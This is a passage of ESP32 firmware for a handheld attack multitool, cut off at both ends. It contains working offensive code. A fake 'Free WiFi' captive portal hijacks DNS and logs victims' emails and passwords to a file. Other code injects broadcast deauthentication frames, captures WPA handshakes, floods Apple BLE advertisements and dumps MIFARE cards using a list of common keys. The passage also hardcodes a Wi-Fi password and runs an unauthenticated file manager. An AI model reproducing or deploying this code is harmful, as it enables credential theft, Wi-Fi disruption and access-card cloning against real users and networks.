            <span class='material-icons-round' style='font-size:18px;'>attach_file</span>
            Choose
          </label>
          <span id='fname'>No file selected</span>
          <input type='file' id='fu' name='u' onchange="document.getElementById('fname').textContent=this.files[0].name">
          <input class='btn' type='submit' value='Upload'>
        </div>
      </form>
    </div>

    <div class='card'>
      <div class='card-title'><span class='material-icons-round'>folder</span> Storage</div>)";

  File rootDir = LittleFS.open("/");
  File f = rootDir.openNextFile();
  bool hasFiles = false;

  while (f) {
    hasFiles = true;
    String n = "/" + String(f.name());
    bool isPcap = n.endsWith(".pcap");
    String iconClass = isPcap ? "file-icon pcap" : "file-icon";
    String icon = isPcap ? "key" : "description";
    String chipClass = isPcap ? "chip pcap" : "chip";
    String chipText = isPcap ? "PCAP" : "FILE";

    html += "<div class='file-pill'>";
    html += "<div class='file-left'>";
    html += "<div class='" + iconClass + "'><span class='material-icons-round'>" + icon + "</span></div>";
    html += "<div><div class='file-name'>" + n + "<span class='" + chipClass + "'>" + chipText + "</span></div>";
    html += "<div class='file-size'>" + String(f.size()) + " bytes</div></div></div>";
    html += "<div class='file-actions'>";
    html += "<a class='icon-btn' href='/download?file=" + n + "' title='Download'><span class='material-icons-round'>download</span></a>";
    html += "<a class='icon-btn' href='#' onclick=\"ren('" + n + "')\" title='Rename'><span class='material-icons-round'>edit</span></a>";
    html += "<a class='icon-btn del' href='/del?file=" + n + "' onclick=\"return confirm('Delete " + n + "?')\" title='Delete'><span class='material-icons-round'>delete</span></a>";
    html += "</div></div>";

    f = rootDir.openNextFile();
  }

  if (!hasFiles) {
    html += "<div class='empty'><span class='material-icons-round'>inventory_2</span>No files on flash storage</div>";
  }

  rootDir.close();

  html += R"(
    </div>
  </div>

  <!-- CONSOLE TAB -->
  <div class='tab-content' id='content-console'>
    <div class='card'>
      <div class='card-title'><span class='material-icons-round'>terminal</span> Serial Console</div>
      <div class='console-box' id='console-box'>No output yet...</div>
      <div class='console-actions'>
        <button class='btn outlined' onclick='fetchConsole()'>
          <span class='material-icons-round' style='font-size:16px;vertical-align:middle;'>refresh</span> Refresh
        </button>
        <button class='btn outlined' onclick='clearConsole()'>
          <span class='material-icons-round' style='font-size:16px;vertical-align:middle;'>delete_sweep</span> Clear
        </button>
      </div>
    </div>
  </div>

</div>
</body></html>)";

  server.send(200, "text/html", html);
}

void handleFileDelete() {
  String filename = server.arg("file");
  if (LittleFS.remove(filename)) {
    server.sendHeader("Location", "/");
    server.send(302, "text/plain", "");
  } else {
    server.send(500, "text/plain", "Delete error.");
  }
}

void updateFileCache() {
  cachedFileCount = 0;
  for(int i=0; i<20; i++) fileList[i] = ""; // Чистим

  File root = LittleFS.open("/");
  if (!root) {
      // Если диск не открылся, добавим фейковый файл для теста
      fileList[0] = "LittleFS Error";
      cachedFileCount = 1;
      return;
  }

  File file = root.openNextFile();
  while (file && cachedFileCount < 20) {
    String n = String(file.name());
    if (n.startsWith("/")) n = n.substring(1); // Убираем слэш
    
    fileList[cachedFileCount] = n;
    cachedFileCount++;
    file = root.openNextFile();
  }
  
  // ТЕСТ: Если файлов реально 0, создадим "заглушку", чтобы проверить экран
  if (cachedFileCount == 0) {
      fileList[0] = "No files found";
      cachedFileCount = 1;
  }
}

struct {
  bool got_eapol = false;
  String last_ssid = "";
  uint8_t target_bssid[6];
  int current_ch = 1;
  int current_rssi = 0; // Добавили RSSI
  bool target_found = false;
  bool deauth_enabled = true;
  bool menu_active = false;
} kfw_pwn;

// Структура для сохранения пакетов в формате PCAP
void writePcapHeader(File &f) {
  uint32_t magic = 0xa1b2c3d4; uint16_t v_maj = 2, v_min = 4;
  int32_t zone = 0; uint32_t sig = 0, snap = 65535, net = 105; // 105 для 802.11
  f.write((uint8_t*)&magic, 4); f.write((uint8_t*)&v_maj, 2); f.write((uint8_t*)&v_min, 2);
  f.write((uint8_t*)&zone, 4); f.write((uint8_t*)&sig, 4); f.write((uint8_t*)&snap, 4); f.write((uint8_t*)&net, 4);
}

// Поместить перед setup()
uint8_t lp_airpods[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t lp_appletv[] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t lp_keyboard[] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x13, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};

int selectedAppleType = 0; // Переменная для хранения выбора

void startAppleJuice(int type) {
  // В NimBLE нет getInitialized(), просто инициализируем, если сервер еще не создан
  if (NimBLEDevice::getServer() == nullptr) {
    NimBLEDevice::init("");
  }
  
  NimBLEAdvertising *pAdv = NimBLEDevice::getAdvertising();
  NimBLEAdvertisementData oData;

  // Исправляем addData: передаем массив и его размер отдельно
  if (type == 0) oData.addData(lp_airpods, sizeof(lp_airpods));
  else if (type == 1) oData.addData(lp_appletv, sizeof(lp_appletv));
  else if (type == 2) oData.addData(lp_keyboard, sizeof(lp_keyboard));

  pAdv->setAdvertisementData(oData);
  
  // В NimBLE тип рекламы задается иначе, но для Apple Juice 
  // обычно достаточно стандартных настроек. Просто запускаем:
  pAdv->start();
}

void stopBLE() {
  // Проверяем, инициализирован ли прибор через проверку существования рекламы
  if (NimBLEDevice::getAdvertising() != nullptr) {
    NimBLEDevice::getAdvertising()->stop();
  }
}

const char* faces[] = {
  "( o.o )",  // 0: Спокоен
  "( -.- )",  // 1: Спит
  "( O_O )",  // 2: Нашёл цель!
  "( >_< )",  // 3: Деаут атака
  "( ^_^ )",  // 4: Хэндшейк!
  "( X_X )",  // 5: Ошибка
  "( Q_Q )",  // 6: Грустит
  "( @_@ )",  // 7: Сканирует
  "( *_* )",  // 8: Взволнован
  "( ._. )",  // 9: Задумался
  "( T_T )",  // 10: Плачет (нет целей долго)
  "( 0_0 )"   // 11: Шокирован (сильный сигнал)
};

enum PwnStep {STEP_SCANNING, STEP_LOCKED, STEP_RELAX};
PwnStep currentPwnStep = STEP_SCANNING; // Переименовали, чтобы не конфликтовало

int getNextDumpNumber() {
  int num = 1;
  while (LittleFS.exists("/dump_" + String(num) + ".txt")) {
    num++;
  }
  return num;
}

String getCardType() {
  MFRC522::PICC_Type piccType = rfid.PICC_GetType(rfid.uid.sak);
  switch (piccType) {
    case MFRC522::PICC_TYPE_MIFARE_MINI:  return "MIFARE Mini (320B)";
    case MFRC522::PICC_TYPE_MIFARE_1K:   return "MIFARE Classic 1K";
    case MFRC522::PICC_TYPE_MIFARE_4K:   return "MIFARE Classic 4K";
    case MFRC522::PICC_TYPE_MIFARE_UL:   return "MIFARE Ultralight";
    case MFRC522::PICC_TYPE_ISO_14443_4: return "ISO 14443-4";
    case MFRC522::PICC_TYPE_ISO_18092:   return "ISO 18092 (NFC)";
    default:                              return "Unknown";
  }
}

int getSectorCount() {
  MFRC522::PICC_Type piccType = rfid.PICC_GetType(rfid.uid.sak);
  switch (piccType) {
    case MFRC522::PICC_TYPE_MIFARE_MINI: return 5;
    case MFRC522::PICC_TYPE_MIFARE_1K:  return 16;
    case MFRC522::PICC_TYPE_MIFARE_4K:  return 40;
    default:                             return 16;
  }
}

#if !defined(CHIP_ESP32C3)
void performFullDump() {
  int dumpNum = getNextDumpNumber();
  String fileName = "/dump_" + String(dumpNum) + ".txt";
  File f = LittleFS.open(fileName, "w");
  if (!f) return;

  // --- Заголовок ---
  f.println("================================");
  f.println("       KFW RFID DUMP v1.0       ");
  f.println("================================");
  f.println("Time:   " + String(millis() / 1000) + "s uptime");
  f.println("UID:    " + lastUid);
  f.println("Type:   " + getCardType());
  f.print  ("SAK:    0x"); f.println(rfid.uid.sak, HEX);
  f.print  ("ATQA:   0x"); 
  for (byte i = 0; i < rfid.uid.size; i++) {
    f.print(rfid.uid.uidByte[i] < 0x10 ? "0" : "");
    f.print(rfid.uid.uidByte[i], HEX);
  }
  f.println();
  f.println("================================");
  f.println();

  byte commonKeys[][6] = {
    {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF},
    {0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5},
    {0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5},
    {0x4D, 0x3A, 0x99, 0xC3, 0x51, 0xDD},
    {0x1A, 0x98, 0x2C, 0x7E, 0x45, 0x9A},
    {0xD3, 0xF7, 0xD3, 0xF7, 0xD3, 0xF7},
    {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF},
    {0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x74, 0x4B, 0xD1, 0x24, 0xC6, 0x12},
    {0x26, 0x97, 0x35, 0x98, 0x6A, 0x44}
  };
  int keyCount = 10;
  int sectorCount = getSectorCount();

  int successSectors = 0;
  int failSectors = 0;

  for (byte sector = 0; sector < sectorCount; sector++) {
    bool sectorAuth = false;
    MFRC522::MIFARE_Key key;
    String usedKey = "";

    f.print("--- Sector "); f.print(sector);
    f.println(" ---");

    // Пробуем все ключи
    for (int k = 0; k < keyCount; k++) {
      for (byte b = 0; b < 6; b++) key.keyByte[b] = commonKeys[k][b];

      byte firstBlock = sector * 4;
      MFRC522::StatusCode status = rfid.PCD_Authenticate(
        MFRC522::PICC_CMD_MF_AUTH_KEY_A, firstBlock, &key, &(rfid.uid)
      );

      if (status == MFRC522::STATUS_OK) {
        sectorAuth = true;
        // Запоминаем какой ключ подошёл
        usedKey = "";
        for (byte b = 0; b < 6; b++) {
          usedKey += String(commonKeys[k][b] < 0x10 ? "0" : "");
          usedKey += String(commonKeys[k][b], HEX);
        }
        usedKey.toUpperCase();
        break;
      }
    }

    if (sectorAuth) {
      successSectors++;
      f.println("Key A:  " + usedKey);

      for (byte block = 0; block < 4; block++) {
        byte blockAddr = sector * 4 + block;
        byte buffer[18];
        byte size = sizeof(buffer);

        if (rfid.MIFARE_Read(blockAddr, buffer, &size) == MFRC522::STATUS_OK) {
          // HEX
          f.print("B"); f.print(block); f.print(" HEX:  ");
          for (byte i = 0; i < 16; i++) {
            f.print(buffer[i] < 0x10 ? "0" : "");
            f.print(buffer[i], HEX);
            f.print(" ");
          }
          f.println();

          // ASCII
          f.print("B"); f.print(block); f.print(" ASCII: ");
          for (byte i = 0; i < 16; i++) {
            f.print(isPrintable(buffer[i]) ? (char)buffer[i] : '.');
          }
          f.println();
        } else {
          f.println("B" + String(block) + " READ FAILED");
        }
      }
    } else {
      failSectors++;
      f.println("AUTH FAILED (all keys tried)");
    }
    f.println();
  }

  // --- Итог ---
  f.println("================================");
  f.println("SUMMARY");
  f.println("================================");
  f.print("Sectors OK:     "); f.println(successSectors);
  f.print("Sectors FAILED: "); f.println(failSectors);
  f.print("Total sectors:  "); f.println(sectorCount);
  f.println("================================");

  f.close();
  rfid.PCD_StopCrypto1();
}
#endif

void handleSerial() {
  server.send(200, "text/plain", serialBuffer);
}

void handleSerialClear() {
  serialBuffer = "";
  server.send(200, "text/plain", "OK");
}

void handleFileDownload() {
  String path = server.arg("file");
  if (LittleFS.exists(path)) {
    File f = LittleFS.open(path, "r");
    String filename = path.substring(path.lastIndexOf('/') + 1);
    server.sendHeader("Content-Disposition", "attachment; filename=\"" + filename + "\"");
    server.streamFile(f, "application/octet-stream");
    f.close();
  } else server.send(404, "text/plain", "404 Not Found");
}

void handleFileRename() {
  String oldName = server.arg("old");
  String newName = server.arg("new");
  if (oldName.length() > 0 && newName.length() > 0) {
    if (LittleFS.rename(oldName, newName)) {
      server.send(200, "text/html", "Renamed successfully! <a href='/'>Back</a>");
    } else {
      server.send(500, "text/plain", "Rename error.");
    }
  }
}










void setup() {
  if(!LittleFS.begin(true)){
    Serial.println("LittleFS Mount Failed");
    return; // Stop execution to prevent crashing on file access
  }
  //if(!LittleFS.exists("/cal_hs")) {
    //LittleFS.mkdir("/cal_hs");
  //}
  Serial.begin(115200);
  display.begin();
  buttons.begin();
  LittleFS.begin(true);
  server.on("/", HTTP_GET, handleRoot);
  server.on("/download", HTTP_GET, handleFileDownload);
  server.on("/del", HTTP_GET, handleFileDelete);
  server.on("/serial", HTTP_GET, handleSerial);
  server.on("/serial-clear", HTTP_GET, handleSerialClear);
  server.on("/rename", HTTP_GET, handleFileRename);
  server.on("/create", HTTP_POST, handleFileCreate);
  server.on("/upload", HTTP_POST, [](){ server.send(200); }, handleFileUpload);
  server.on("/get", HTTP_GET, [](){
    if (currentState == EVIL_PORTAL) {
      String email = server.arg("email");
      String password = server.arg("password");
      Serial.println("Captured: " + email + " / " + password);
      File f = LittleFS.open("/creds.txt", "a");
      if(f) {
        f.println("Email: " + email + " | Pass: " + password);
        f.close();
      }
      server.send(200, "text/html", "<html><body><h2>Error</h2></body></html>");
    }
  });
  
  // Обработчик для всех остальных запросов (Captive Portal)
  server.onNotFound([]() {
    if (currentState == EVIL_PORTAL) {
      // Перенаправляем все запросы на главную страницу портала
      handleRoot();
    } else {
      server.send(404, "text/plain", "Not Found");
    }
  });
  
  TJpgDec.setSwapBytes(true);
  WiFi.mode(WIFI_OFF);
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(DisplayWrapper::COLOR_WHITE);
  
  // Инициализация SPI для RFID
#if !defined(CHIP_ESP32C3)
  SPI.begin(SCK_PIN, MISO_PIN, MOSI_PIN, SS_PIN);
  rfid.PCD_Init();
  byte v = rfid.PCD_ReadRegister(rfid.VersionReg);
  Serial.print("RFID Software Version: 0x");
  Serial.println(v, HEX);
  if (v == 0x00 || v == 0xFF) {
    Serial.println("WARNING: RFID Reader not found! Check wiring.");
  }
#else
  Serial.println("RFID not supported on ESP32-C3 (no SPI HSPI)");
#endif

  display.drawRect(0, 0, 128, 64, DisplayWrapper::COLOR_WHITE);
  display.setCursor(20, 20);
  display.print("KFW V1 Release");
  display.setCursor(18, 40);
  display.print("@labubuahhginger");
  display.display();
  delay(3000);
}

void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* payload = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;

  kfw_pwn.current_rssi = pkt->rx_ctrl.rssi;
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;

  // --- 1. Поиск Beacon (только если мы НЕ зафиксированы на цели) ---
  if (payload[0] == 0x80 && currentPwnStep == STEP_SCANNING) { 
    int ssid_len = payload[37];
    if (ssid_len > 0 && ssid_len <= 32) {
      char temp_ssid[33];
      memcpy(temp_ssid, &payload[38], ssid_len);
      temp_ssid[ssid_len] = '\0';
      
      String cleanSSID = "";
      for(int i=0; i<ssid_len; i++) {
        if(isalnum(temp_ssid[i])) cleanSSID += temp_ssid[i];
        else cleanSSID += "_";
      }
      
      kfw_pwn.last_ssid = cleanSSID;
      memcpy(kfw_pwn.target_bssid, &payload[10], 6);
      kfw_pwn.target_found = true; 
      // Как только нашли что-то - loop переключит состояние в TARGET_LOCKED
    }
  }

  // --- 2. Поиск EAPOL (ищем всегда, если есть активная цель) ---
  if (len > 30) { // Минимальная длина для проверки EAPOL
    for (int i = 0; i < len - 1; i++) {
      if (payload[i] == 0x88 && payload[i+1] == 0x8e) {
        // Проверяем, наш ли это таргет (по BSSID)
        if (memcmp(&payload[10], kfw_pwn.target_bssid, 6) == 0 || memcmp(&payload[16], kfw_pwn.target_bssid, 6) == 0) {
          
          if (!kfw_pwn.got_eapol) {
            kfw_pwn.got_eapol = true;
            pktCount++;
          }

          String filename = "/" + kfw_pwn.last_ssid + ".pcap";
          File f = LittleFS.open(filename, "a"); 
          if (!f) f = LittleFS.open(filename, "w");

          if (f) {
            if (f.size() == 0) writePcapHeader(f);
            uint32_t sec = millis() / 1000;
            uint32_t usec = (millis() % 1000) * 1000;
            f.write((uint8_t*)&sec, 4);
            f.write((uint8_t*)&usec, 4);
            f.write((uint8_t*)&len, 4);
            f.write((uint8_t*)&len, 4);
            f.write(payload, len);
            f.flush(); 
            f.close();
          }
        }
        break; 
      }
    }
  }
}

void sendDeauth(uint8_t* bssid) {
  uint8_t deauthPkt[26] = {
    0xC0, 0x00, 0x3A, 0x01, 
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Куда (Broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // От кого (подменим на BSSID)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00, 0x01, 0x00
  };
  memcpy(&deauthPkt[10], bssid, 6);
  memcpy(&deauthPkt[16], bssid, 6);
  
  for(int i = 0; i < 3; i++) { // Посылаем пачку пакетов
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPkt, 26, false);
    delay(5);
  }
}

bool tjpg_output(int16_t x, int16_t y, uint16_t w, uint16_t h, uint16_t* bitmap) {
  for (int j = 0; j < h; j++) {
    for (int i = 0; i < w; i++) {
      // Переводим цвет в ч/б: если яркость выше порога — рисуем белую точку
      uint16_t col = bitmap[i + j * w];
      uint8_t r = (col >> 11) << 3;
      uint8_t g = ((col >> 5) & 0x3F) << 2;
      uint8_t b = (col & 0x1F) << 3;
      if ((r + g + b) / 3 > 127) display.drawPixel(x + i, y + j, WHITE);
    }
  }
  return true;
}

#if !defined(CHIP_ESP32C3)
// Функция - ТОЛЬКО логика, без display и без проверки карты
void fullFormatCard() {
  MFRC522::MIFARE_Key key;
  for (byte i = 0; i < 6; i++) key.keyByte[i] = 0xFF;

  byte blankData[16] = {0};
  byte factoryTrailer[16] = {
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0x07, 0x80, 0x69,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF
  };

  for (byte sector = 0; sector < 16; sector++) {
    byte trailerBlock = sector * 4 + 3;
    MFRC522::StatusCode status = rfid.PCD_Authenticate(MFRC522::PICC_CMD_MF_AUTH_KEY_A, trailerBlock, &key, &(rfid.uid));
    if (status == MFRC522::STATUS_OK) {
      for (byte i = 0; i < 3; i++) {
        byte blockAddr = sector * 4 + i;
        if (blockAddr == 0) continue;
        rfid.MIFARE_Write(blockAddr, blankData, 16);
      }
      rfid.MIFARE_Write(trailerBlock, factoryTrailer, 16);
    }
  }
  rfid.PICC_HaltA();
  rfid.PCD_StopCrypto1();
}
#endif

void loop() {
  buttons.update();
  
  // Обработка DNS сервера для Evil Portal
  if (currentState == EVIL_PORTAL) {
    dnsServer.processNextRequest();
  }
  
  if (currentState == WEBUI_ACTIVE || currentState == EVIL_PORTAL) {
    server.handleClient();
  }

  while (Serial.available()) {
    char c = Serial.read();
    serialBuffer += c;
    if (serialBuffer.length() > 3000) 
      serialBuffer = serialBuffer.substring(1500);
  }

  bool n = buttons.nextPressed();
  bool ok = buttons.okPressed();
  
  if (n || ok) {
    if (n) {
      if (currentState == IR_MENU && menuIndex > 4) {
        menuIndex = 0;
      }
      if (currentState == BEACON_COUNT_SEL) {
        beaconCount = (beaconCount >= 60) ? 5 : beaconCount + 5;
      } 
      else if (currentState == LITTLEFS_LIST) {
        int fCount = countFiles();
        scrollIndex = (scrollIndex + 1) % (fCount + 1);
      }
      else if (currentState == WIFI_SCAN_LIST) {
        if (foundDevices > 0) scrollIndex = (scrollIndex + 1) % foundDevices;
      }
      else if (currentState == CH_GRAPH) {
        menuIndex = (menuIndex + 1) % 13; 
      }
      else if (currentState == SETTINGS_SCREEN) {
        menuIndex = (menuIndex + 1) % 4; 
      }
      else if (currentState == WIFI_SCAN_LIST) {
        scrollIndex++;
        if (scrollIndex > foundDevices) scrollIndex = 0; 
      }

      else if (currentState == WIFI_INFO_SCREEN) {
        menuIndex++;
        if (menuIndex > 1) menuIndex = 0; 
      }
      else {
        int s = 7; 
        if (currentState == MAIN_MENU) s = 7;
        else if (currentState == WIFI_MENU) s = 8;
        else if (currentState == WIFI_ATTACKS) s = 3; 
        else if (currentState == BEACON_SOURCE) s = 3;
        else if (currentState == SNIFFERS_MENU) s = 4;
        else if (currentState == BLE_MENU) s = 4;
        else if (currentState == FILES_MENU) s = 2;
        else if (currentState == FILE_OPTIONS) s = 3;
        else if (currentState == PWN_MODE && kfw_pwn.menu_active) s = 3;
        
        menuIndex = (menuIndex + 1) % s;
      }
    }

    // 2. Обработка кнопки OK (Выбор)
    // 2. Обработка кнопки OK (Выбор)
    if (ok) {
      if (currentState == CH_GRAPH) {
        if (selectModeForPwn) {
          // Если зашли через Гочи — стартуем атаку
          target_ch = menuIndex + 1; 
          WiFi.mode(WIFI_STA); 
          esp_wifi_set_promiscuous(true); 
          esp_wifi_set_promiscuous_rx_cb(&sniffer_callback);
          esp_wifi_set_channel(target_ch, WIFI_SECOND_CHAN_NONE);
          currentState = PWN_MODE;
          pktCount = 0;
          kfw_pwn.menu_active = false;
          selectModeForPwn = false; 
        } else {
          // Если зашли просто посмотреть — возвращаемся в меню (откуда пришли)
          esp_wifi_set_promiscuous(false); 
          // Если зашли из Снифферов, возвращаемся в Снифферы, иначе в Вифи
          currentState = (menuIndex == 2 && currentState == SNIFFERS_MENU) ? SNIFFERS_MENU : WIFI_MENU;
        }
      }
      // 2. Выходы из других режимов
      else if (currentState == BLE_RUN) { stopBLE(); currentState = BLE_MENU; }
      else if (currentState == BEACON_RUN) { currentState = WIFI_ATTACKS; }
      else if (currentState == SYSTEM_INFO) { currentState = MAIN_MENU; menuIndex = 0; }
      else if (currentState == DEAUTH_RUN) { currentState = WIFI_MENU; }
      else if (currentState == EVIL_PORTAL) {
        dnsServer.stop();
        WiFi.softAPdisconnect(true);
        server.stop();
        currentState = WIFI_MENU;
      }
      else if (currentState == WEBUI_ACTIVE) { WiFi.softAPdisconnect(true); currentState = WIFI_MENU; }
      else if (currentState == PROBE_SNIFFER || currentState == BEACON_SNIFFER) { 
        esp_wifi_set_promiscuous(false); 
        currentState = SNIFFERS_MENU; 
      }
      else if (currentState == IR_RECV) {
        irrecv.disableIRIn();
        currentState = IR_MENU;
        lastIrCode = 0;
        // WiFi возвращать не будем здесь, вернем в главном меню если надо
      }
      // 3. Если мы не в "бегающем" режиме, а в меню — идем в switch
      else {
        switch(currentState) {
          case PWN_MODE:
            if (kfw_pwn.menu_active) {
              if (menuIndex == 0) kfw_pwn.menu_active = false; // Resume
              else if (menuIndex == 1) kfw_pwn.deauth_enabled = !kfw_pwn.deauth_enabled; // Toggle Deauth
              else { // Exit
                esp_wifi_set_promiscuous(false); 
                currentState = WIFI_MENU; 
                kfw_pwn.menu_active = false; 
                menuIndex = 0;
              }
            } else {
            kfw_pwn.menu_active = true; // Открыть меню
            menuIndex = 0;
          }
          break;
          
          case RFID_EMULATION:
            rfid.PCD_Init();
            currentState = RFID_MENU;
            menuIndex = 0;
            break;

          case MAIN_MENU:
            if(menuIndex == 0) currentState = WIFI_MENU;
            else if(menuIndex == 1) currentState = BLE_MENU;
            else if(menuIndex == 2) {
              currentState = IR_MENU;
              menuIndex = 0;
            }
#if !defined(CHIP_ESP32C3)
            else if(menuIndex == 3) currentState = RFID_MENU;
            else if(menuIndex == 4) currentState = FILES_MENU;
            else if(menuIndex == 5) currentState = SYSTEM_INFO;
            else if(menuIndex == 6) currentState = SETTINGS_SCREEN;
#else
            else if(menuIndex == 3) currentState = FILES_MENU;
            else if(menuIndex == 4) currentState = SYSTEM_INFO;
            else if(menuIndex == 5) currentState = SETTINGS_SCREEN;
#endif
            menuIndex = 0;
            break;

#if !defined(CHIP_ESP32C3)
          case RFID_MENU:
          if (menuIndex == 0) {
            currentState = RFID_RECV;
          }
          else if (menuIndex == 1) {
            currentState = RFID_DUMP_PROCESS;
          }
          else if (menuIndex == 3) {
            currentState = RFID_EMULATION;
          }
          else if (menuIndex == 2) {
            currentState = FORMAT_CARD;
            menuIndex = 0;
          }
          else {
            currentState = MAIN_MENU;
            menuIndex = 3;
          }
          menuIndex = 0;
          break;

          case RFID_RECV:
            if (ok) {
              if (lastUid != "") {
                File f = LittleFS.open("/rfid_logs.txt", "a");
                if (f) {
                  f.println("UID: " + lastUid);
                  f.close();
                }
              }
            currentState = RFID_MENU;
            menuIndex = 0;
            }
          break;
#endif

          case SETTINGS_SCREEN:
            if (menuIndex == 0) {
              wifiPowerIdx = (wifiPowerIdx + 1) % 5;
              applyWifiPower();
            } else if (menuIndex == 1) {
              blePowerIdx = (blePowerIdx + 1) % 9;
              applyBlePower();
            } else if (menuIndex == 2) {
              brightIdx = (brightIdx + 1) % 5;
              display.ssd1306_command(SSD1306_SETCONTRAST);
            } else if (menuIndex == 3) {
              currentState = MAIN_MENU;
              menuIndex = 5;
            }
            break;

          case BEACON_RUN:
            esp_wifi_set_promiscuous(false);
            currentState = WIFI_ATTACKS;
            break;

          case IR_MENU:
            if(menuIndex == 0) { 
              irrecv.enableIRIn(); 
              currentState = IR_RECV; 
            }
            else if(menuIndex == 1) { 
              if(lastIrCode != 0) {
                irsend.begin();
                irsend.send(lastIrProtocol, lastIrCode, 32); 
              }
              currentState = IR_MENU;
            }
            else if (menuIndex == 2) { 
              currentState = TV_B_GONE_MODE;
              runTVBGone(); 
            }
            else currentState = MAIN_MENU;
            menuIndex = 0; break;

          case WIFI_MENU:
            if(menuIndex == 0) { 
              String ssid = "";
              String password = "";
              File f = LittleFS.open("/webui.txt", "r");
              if(f) {
                ssid = f.readStringUntil('\n');
                password = f.readStringUntil('\n');
                f.close();
                ssid.trim();
                password.trim();
              }
              if(ssid == "") { ssid = "eladenselasobinubali"; password = "epresoumenaligaeligosa"; }
              currentState = WEBUI_ACTIVE; 
              WiFi.begin(ssid.c_str(), password.c_str()); 
              while (WiFi.status() != WL_CONNECTED) delay(500); 
              server.begin(); 
            }
            else if(menuIndex == 1) { WiFi.mode(WIFI_STA); foundDevices = WiFi.scanNetworks(); currentState = WIFI_SCAN_LIST; }
            else if(menuIndex == 2) currentState = WIFI_ATTACKS;
            else if(menuIndex == 3) currentState = SNIFFERS_MENU;
            else if(menuIndex == 4) { 
               WiFi.mode(WIFI_STA); foundDevices = WiFi.scanNetworks(); 
               selectModeForPwn = false; currentState = CH_GRAPH; menuIndex = 0;
            }
            else if(menuIndex == 5) { 
              WiFi.mode(WIFI_STA); foundDevices = WiFi.scanNetworks(); 
              selectModeForPwn = true; currentState = CH_GRAPH; menuIndex = 0;
            }
            else if(menuIndex == 6) {
              WiFi.disconnect(true);
              delay(200);
              WiFi.mode(WIFI_AP);
              WiFi.softAP("Free WiFi");
              delay(300);
              Serial.println("AP IP: " + WiFi.softAPIP().toString());
              
              // Настраиваем DNS сервер для captive portal
              dnsServer.stop();
              dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
              dnsServer.start(53, "*", WiFi.softAPIP());
              
              server.stop();
              delay(100);
              server.begin();
              Serial.println("Server restarted for Evil Portal");
              currentState = EVIL_PORTAL;
              menuIndex = 0;
            }
            else currentState = MAIN_MENU;
            menuIndex = 0; break;

          case WIFI_INFO_SCREEN:
            if (menuIndex == 0) {
              // Нажали ATTACK
              esp_wifi_set_channel(target_ch, WIFI_SECOND_CHAN_NONE);
              pktCount = 0;
              currentState = DEAUTH_RUN;
            } else {
              // Нажали CANCEL
              currentState = WIFI_SCAN_LIST;
            }
            break;

          case SNIFFERS_MENU:
            if(menuIndex == 0) { 
               WiFi.mode(WIFI_STA); esp_wifi_set_promiscuous(true); esp_wifi_set_promiscuous_rx_cb(&sniffer_probes_cb);
               currentState = PROBE_SNIFFER; probesCount = 0;
            }
            else if(menuIndex == 1) { 
               WiFi.mode(WIFI_STA); esp_wifi_set_promiscuous(true); esp_wifi_set_promiscuous_rx_cb(&sniffer_beacons_cb);
               currentState = BEACON_SNIFFER; beaconsFound = 0;
            }
            else if(menuIndex == 2) { 
               WiFi.mode(WIFI_STA); foundDevices = WiFi.scanNetworks(); currentState = CH_GRAPH;
            }
            else currentState = WIFI_MENU;
            menuIndex = 0; break;

          case FILES_MENU:
            if(menuIndex == 0) { 
              updateFileCache(); // Обновляем кэш перед входом
              currentState = LITTLEFS_LIST; 
              scrollIndex = 0; 
            }
            else currentState = MAIN_MENU;
            menuIndex = 0; 
          break;

          case LITTLEFS_LIST: {
            if (cachedFileCount == 0) {
              // Если файлов нет, нажатие OK пробует их найти снова
              Serial.println("Force scan start...");
              updateFileCache(); 
              scrollIndex = 0;
            } else {
              if (scrollIndex == cachedFileCount) { 
                currentState = FILES_MENU;
                menuIndex = 0;
              } else {
                selectedFile = fileList[scrollIndex];
                if (selectedFile != "") {
                  currentState = FILE_OPTIONS;
                  menuIndex = 0;
                }   
              }
            }
          } break;

          case FILE_OPTIONS:
            if (menuIndex == 0) currentState = FILE_CONTENT;
            else if (menuIndex == 1) {
              LittleFS.remove("/" + selectedFile);
              updateFileCache(); // Обновляем кэш после удаления
              currentState = LITTLEFS_LIST;
              scrollIndex = 0;
            } 
            else currentState = LITTLEFS_LIST; 
            menuIndex = 0;
            break;

          case FILE_CONTENT:
            currentState = LITTLEFS_LIST; 
            break;

          case WIFI_ATTACKS:
            if(menuIndex == 0) { 
              WiFi.mode(WIFI_STA); 
              foundDevices = WiFi.scanNetworks(); 
              currentState = WIFI_SCAN_LIST; 
              scrollIndex = 0; 
            }
            else if(menuIndex == 1) currentState = BEACON_SOURCE;
            else currentState = WIFI_MENU;
            menuIndex = 0; break;

          case BEACON_SOURCE:
            if(menuIndex == 0) { 
